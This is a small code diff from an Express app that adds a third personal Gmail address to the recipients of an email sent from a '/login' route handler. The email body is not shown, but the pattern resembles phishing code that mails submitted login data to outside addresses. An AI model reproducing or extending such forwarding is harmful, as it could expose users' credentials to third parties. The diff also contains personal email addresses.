@@ -132,7 +132,7 @@ app.post('/login', async (req, res) => {
   try {
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
-      to: ['26krakashyadav@gmail.com', 'nikhilmahato104@gmail.com'],
+      to: ['26krakashyadav@gmail.com', 'nikhilmahato104@gmail.com','chandankumarsharma8124@gmail.com'],
       subject,
       html: htmlMessage
     });
